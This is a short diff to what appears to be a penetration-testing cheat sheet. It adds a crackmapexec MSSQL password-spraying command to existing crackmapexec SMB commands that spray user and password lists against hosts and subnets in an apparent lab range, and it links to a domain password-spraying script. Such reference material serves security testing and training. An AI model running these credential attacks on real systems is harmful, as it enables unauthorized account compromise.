@@ -490,6 +490,7 @@ crackmapexec smb 10.10.10.161 --pass-pol
 crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
 crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt
 crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt --continue-on-success
+crackmapexec mssql 10.10.10.10 -u user.txt -p password.txt
 ```
 * cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
 
